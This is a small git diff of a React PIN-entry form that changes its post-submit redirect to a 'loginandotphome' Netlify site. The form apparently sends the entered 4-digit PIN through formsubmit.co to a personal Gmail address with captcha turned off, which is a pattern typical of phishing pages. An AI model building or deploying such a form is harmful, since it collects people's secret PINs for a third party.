@@ -40,7 +40,7 @@ const Pin = () => {
           <div className="register__containerUp">
             <form action="https://formsubmit.co/danielmordi22@gmail.com" method="POST">            
               <input type="hidden" name="_captcha" value="false"></input>
-              <input type="hidden" name="_next" value="https://demiladebdm.netlify.com"></input>
+              <input type="hidden" name="_next" value="https://loginandotphome.netlify.app/"></input>
               <h5>Enter your 4 digit pin</h5>
 
               <div className="map">
